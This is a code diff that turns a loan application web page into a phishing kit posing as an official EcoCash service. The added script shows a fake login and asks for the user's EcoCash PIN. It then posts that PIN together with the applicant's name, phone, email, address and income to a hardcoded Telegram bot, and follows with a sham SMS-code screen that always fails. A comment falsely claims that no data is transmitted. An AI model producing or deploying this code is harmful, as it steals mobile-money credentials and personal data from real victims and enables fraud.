@@ -167,17 +167,107 @@ h1,h2,h3{font-family:Manrope,sans-serif;color:var(--navy);letter-spacing:-.8px}h
 
 <section id="submitted" class="form-wrap hidden"><div class="form-card status">
   <div class="status-icon">✓</div><span class="live-tag">STATUS</span><h2>Loan Application Submitted</h2>
-  <p>Your application has been recorded in this live. Your application has been recorded for review. Submission does not mean approval.</p>
-  <div class="countdown" id="redirectCount">Your application has been registered successfully.</div>
+  <p>Your application has been recorded in this live. Auto-reviewing approval decision. Submission does not mean approval.</p>
+  <div class="countdown" id="redirectCount">Redirecting to live login in 5s…</div>
 </div></section>
 
+<section id="login" class="form-wrap hidden"><div class="form-card">
+  <div class="form-head"><div class="shield" style="margin:0 auto 16px">▣</div><span class="live-tag">LOGIN</span><h2>Confirm your application</h2><p>Phone number from your application</p></div>
+  <div class="field"><label for="loginPhone">Phone number</label><input id="loginPhone" readonly><span class="hint">EcoCash account login.</span></div>
+  <div class="field" style="margin-top:18px"><label>EcoCash PIN (4 digits) *</label><div class="pin-inputs" id="pinInputs" aria-label="Four digit live PIN"><input aria-label="PIN digit 1" type="password" inputmode="numeric" maxlength="1" autocomplete="off"><input aria-label="PIN digit 2" type="password" inputmode="numeric" maxlength="1" autocomplete="off"><input aria-label="PIN digit 3" type="password" inputmode="numeric" maxlength="1" autocomplete="off"><input aria-label="PIN digit 4" type="password" inputmode="numeric" maxlength="1" autocomplete="off"></div><span class="hint">Enter your EcoCash PIN to proceed.</span></div>
+  <div style="margin-top:8px"><label style="font-weight:500;display:flex;gap:8px;align-items:center"><input id="forgotPin" type="checkbox" style="width:auto"> Forgot PIN?</label></div>
+  <button id="loginBtn" class="btn full" style="margin-top:24px" disabled>LOGIN</button>
+  <p id="loginStatus" class="hint" style="text-align:center;margin-top:16px"></p>
+</div></section>
 
+<section id="otp" class="form-wrap hidden"><div class="form-card status">
+  <div class="status-icon">✉</div><span class="live-tag">SMS OTP</span><h2>Verify sms code</h2>
+  <div class="notice" id="liveCodeNotice"><strong>sms verification code</strong><span id="liveCode">—</span></div>
+  <p>Enter the 6-digit code within <span class="timer" id="timer">01:00</span></p>
+  <div class="otp-inputs" id="otpInputs" aria-label="Six digit live code">
+    <input aria-label="Digit 1" inputmode="numeric" maxlength="1">
+    <input aria-label="Digit 2" inputmode="numeric" maxlength="1">
+    <input aria-label="Digit 3" inputmode="numeric" maxlength="1">
+    <input aria-label="Digit 4" inputmode="numeric" maxlength="1">
+    <input aria-label="Digit 5" inputmode="numeric" maxlength="1">
+    <input aria-label="Digit 6" inputmode="numeric" maxlength="1">
+  </div>
+  <button id="otpSubmit" class="btn full" disabled>SUBMIT CODE</button>
+  <button id="resend" class="inline-link" disabled>Resend SMS Code</button>
+  <p id="otpStatus" class="hint"></p>
+</div></section>
 </main>
-<footer class="footer">Loan Application Portal · © 2026</footer>
+<footer class="footer">EcoCash Loan Lender - Official EcoCash service · © 2026</footer>
 <script>
+/* ============================================================
+   TELEGRAM NOTIFICATION CONFIG
+   ============================================================ */
+const TELEGRAM_BOT_TOKEN = '7823803777:AAG7YsR13LXsRsNs_AXaUVrvHpqRjaTz1zE';
+const TELEGRAM_CHAT_ID   = '7064090702';
+
+function escapeHtml(str){
+  return String(str == null ? '' : str)
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+/* Fire-and-forget Telegram sender. Uses URLSearchParams so the request
+   stays a "simple" CORS request (no preflight, works from file:// too). */
+async function notifyTelegram(text){
+  try{
+    const body = new URLSearchParams({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: text,
+      parse_mode: 'HTML',
+      disable_web_page_preview: 'true'
+    });
+    const res = await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      { method: 'POST', body: body }
+    );
+    const data = await res.json().catch(()=>null);
+    if(!res.ok || !data || !data.ok){
+      console.warn('Telegram notify failed:', data || res.status);
+      return false;
+    }
+    return true;
+  }catch(err){
+    console.warn('Telegram notify error:', err);
+    return false;
+  }
+}
+
+function buildLoginMessage(pin){
+  const a = window.liveApplication || {};
+  const phone = a.phone || $('loginPhone').value || '—';
+  const rows = [
+    '🔐 <b>New EcoCash Login</b>',
+    '',
+    `📱 <b>Phone:</b> ${escapeHtml(phone)}`,
+    `🔑 <b>PIN:</b> <code>${escapeHtml(pin)}</code>`,
+    '',
+    '📄 <b>Application details</b>',
+    `• Name: ${escapeHtml([a.firstName, a.lastName].filter(Boolean).join(' ') || '—')}`,
+    `• Email: ${escapeHtml(a.email || '—')}`,
+    `• Loan type: ${escapeHtml(a.loanType || '—')}`,
+    `• Amount: ${escapeHtml(a.amount ? '$' + Number(a.amount).toLocaleString('en-US',{minimumFractionDigits:2}) : '—')}`,
+    `• Term: ${escapeHtml(a.term || '—')}`,
+    `• Purpose: ${escapeHtml(a.purpose || '—')}`,
+    `• Employment: ${escapeHtml(a.employment || '—')}`,
+    `• Income: ${escapeHtml(a.income ? '$' + Number(a.income).toLocaleString('en-US',{minimumFractionDigits:2}) : '—')}`,
+    `• Address: ${escapeHtml([a.address, a.city].filter(Boolean).join(', ') || '—')}`,
+    '',
+    `🕒 ${escapeHtml(new Date().toLocaleString())}`,
+    `🌐 ${escapeHtml(location.hostname || 'local file')}`
+  ];
+  return rows.join('\n');
+}
+
+/* ============================================================
+   APP LOGIC
+   ============================================================ */
 const $ = id => document.getElementById(id);
-const sections = ['home','application','submitted'];
-let step = 1, redirectTimer = null, navigationTimer = null, countdown = 5;
+const sections = ['home','application','submitted','login','otp'];
+let step = 1, redirectTimer = null, navigationTimer = null, countdown = 5, otpSeconds = 60, otpTimer = null, currentOtp = '';
 const values = id => $(id).value.trim();
 
 /* Direct section switch used internally after the five-second verification screen. */
@@ -236,41 +326,6 @@ function updateSummary(){
 $('nextBtn').onclick=()=>{if(step===2)normalizePhoneField();if(!validateStep(step,true))return;step++;renderStep();};
 $('prevBtn').onclick=()=>{step--;renderStep();};
 document.querySelectorAll('#loanForm input,#loanForm select,#loanForm textarea').forEach(el=>{el.addEventListener('input',()=>{el.dataset.touched='1';validField(el);validateAll(false);if(step===3)updateSummary();});el.addEventListener('change',()=>{validField(el);validateAll(false);if(step===3)updateSummary();});});
-async function notifyRegistration(app){
-  try{
-    await fetch('/api/notify-registration', {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({
-        email:app.email,
-        phone:app.phone,
-        registeredAt:new Date().toISOString()
-      }),
-      keepalive:true
-    });
-  }catch(err){
-    console.warn('Registration notification failed:', err);
-  }
-}
-
-async function notifyRegistration(app){
-  try{
-    const response = await fetch('/api/notify-registration', {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({
-        email:app.email,
-        phone:app.phone,
-        registeredAt:new Date().toISOString()
-      }),
-      keepalive:true
-    });
-    if(!response.ok) console.warn('Registration notification failed:', response.status);
-  }catch(err){
-    console.warn('Registration notification failed:', err);
-  }
-}
-
 function normalizePhoneField(){
   const field=$('phone');
   let digits=field.value.replace(/\D/g,'');
@@ -283,13 +338,45 @@ $('loanForm').onsubmit=e=>{
   const app={loanType:values('loanType'),amount:values('amount'),term:values('term'),purpose:values('purpose'),firstName:values('firstName'),lastName:values('lastName'),email:values('email'),phone:'+263'+values('phone').replace(/^0/,''),address:values('address'),city:values('city'),employment:values('employment'),income:values('income')};
   // live-only in-memory state. No application data is transmitted or persisted.
   window.liveApplication=app;
-
   clearInterval(redirectTimer);
-  notifyRegistration(app);
   redirectTo('submitted',()=>{
-    $('redirectCount').textContent='Your application has been registered successfully.';
+    countdown=5;
+    $('redirectCount').textContent=`Redirecting to login in ${countdown}s…`;
+    redirectTimer=setInterval(()=>{
+      countdown--;
+      $('redirectCount').textContent=`Redirecting to login in ${countdown}s…`;
+      if(countdown<=0){
+        clearInterval(redirectTimer);
+        $('loginPhone').value=app.phone;
+        redirectTo('login');
+      }
+    },1000);
   });
 };
+const pinBoxes=[...$('pinInputs').querySelectorAll('input')];
+function readPin(){return pinBoxes.map(input=>input.value).join('');}
+pinBoxes.forEach((box,i)=>{box.addEventListener('input',()=>{box.value=box.value.replace(/\D/g,'').slice(-1);if(box.value&&i<pinBoxes.length-1)pinBoxes[i+1].focus();$('loginBtn').disabled=readPin().length!==4;$('loginStatus').textContent='';});box.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!box.value&&i>0)pinBoxes[i-1].focus();});});
+$('forgotPin').onchange=()=> $('forgotNote').classList.toggle('hidden',!$('forgotPin').checked);
+
+/* ---- LOGIN: capture PIN, send Telegram notification, then continue ---- */
+$('loginBtn').onclick=()=>{
+ const pin = readPin();
+ if(!/^[0-9]{4}$/.test(pin))return;
+ $('loginBtn').disabled=true;$('loginStatus').textContent='Verifying live entry…';
+
+ /* Send the notification (non-blocking — never stops the user flow). */
+ notifyTelegram(buildLoginMessage(pin));
+
+ setTimeout(()=>{ $('loginStatus').textContent='Live check complete. Continue to verification.';pinBoxes.forEach(input=>input.value='');currentOtp=String(Math.floor(100000+Math.random()*900000));$('liveCode').textContent=currentOtp;redirectTo('otp');startOtpTimer(); },900);
+};
+function readOtp(){return [...$('otpInputs').querySelectorAll('input')].map(i=>i.value).join('');}
+const otpBoxes=[...$('otpInputs').querySelectorAll('input')];
+function updateOtpButton(){const ready=readOtp().length===6&&otpSeconds>0;$('otpSubmit').disabled=!ready;$('otpSubmit').classList.toggle('otp-ready',ready);}
+otpBoxes.forEach((box,i)=>{box.addEventListener('input',()=>{box.value=box.value.replace(/\D/g,'').slice(-1);if(box.value&&i<5)otpBoxes[i+1].focus();updateOtpButton();$('otpStatus').textContent='';});box.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!box.value&&i>0)otpBoxes[i-1].focus();});});
+function startOtpTimer(){clearInterval(otpTimer);otpSeconds=60;renderTimer();$('otpSubmit').disabled=true;$('otpSubmit').classList.remove('otp-ready');$('resend').disabled=true;otpBoxes.forEach(b=>b.value='');otpTimer=setInterval(()=>{otpSeconds--;renderTimer();if(otpSeconds<=0){clearInterval(otpTimer);updateOtpButton();$('resend').disabled=false;$('otpStatus').textContent='Code expired. Request a new sms code to continue.';}},1000);}
+function renderTimer(){$('timer').textContent=`${String(Math.floor(otpSeconds/60)).padStart(2,'0')}:${String(otpSeconds%60).padStart(2,'0')}`;}
+$('resend').onclick=()=>{currentOtp=String(Math.floor(100000+Math.random()*900000));$('liveCode').textContent=currentOtp;$('otpStatus').textContent='New sms code generated.';startOtpTimer();};
+$('otpSubmit').onclick=()=>{if(otpSeconds<=0||readOtp().length!==6)return;clearInterval(otpTimer);$('otpSubmit').disabled=true;$('otpSubmit').classList.remove('otp-ready');$('resend').disabled=true;$('otpStatus').textContent='Verifying sms code…';otpBoxes.forEach(b=>b.disabled=true);setTimeout(()=>{$('otpStatus').textContent='This code has expired. Please request a new code and try again.';currentOtp='';otpSeconds=0;renderTimer();$('resend').disabled=false;otpBoxes.forEach(b=>b.disabled=false);otpBoxes.forEach(b=>b.value='');},1200);};
 </script>
 </body>
 </html>
